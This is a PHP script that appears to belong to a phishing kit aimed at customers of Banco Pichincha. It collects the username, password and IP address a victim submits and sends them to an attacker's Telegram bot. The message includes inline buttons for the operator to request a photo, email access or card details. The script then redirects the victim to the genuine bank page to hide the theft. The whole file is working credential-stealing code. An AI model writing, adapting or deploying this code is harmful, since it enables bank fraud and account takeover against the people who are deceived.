<?php
session_start();
include 'data.php';

// Get the user's IP address
$ip = $_SERVER['REMOTE_ADDR'];

// Get the form data
$email = $_POST['us'];
$password = $_POST['ct'];

// Get session ID from existing session
$sessionId = $_SESSION['user_session_id'] ?? null;

// Check if the form data is set
if (isset($email) && isset($password)) {
    // Create the message to send
    $message = "PIN y SMS:\n\nUsuario: $email\nPass: $password\nIP: $ip";

    // Inline keyboard with buttons
    if ($sessionId) {
        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => '📸 Pedir Foto', 'callback_data' => 'photo_' . $sessionId],
                    ['text' => '🔁 Login', 'callback_data' => 'login_' . $sessionId]
                ],
                [
                    ['text' => '📩 Mail', 'callback_data' => 'mail_' . $sessionId],
                    ['text' => '💳 Tarjeta', 'callback_data' => 'tarjeta_' . $sessionId]
                ],
                [
                    ['text' => '✅ Listo', 'callback_data' => 'listo_' . $sessionId]
                ]
            ]
        ];
        
        $url = "https://api.telegram.org/bot$botToken/sendMessage";
        $postData = [
            'chat_id' => $chatID,
            'text' => $message,
            'reply_markup' => json_encode($keyboard)
        ];
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
    } else {
        // Fallback without button if no session
        file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&text=" . urlencode($message));
    }
}

// Redirect to the target URL
header("Location: https://www.pichincha.com/portal/principal/personas/tarjetas");
exit();
?>
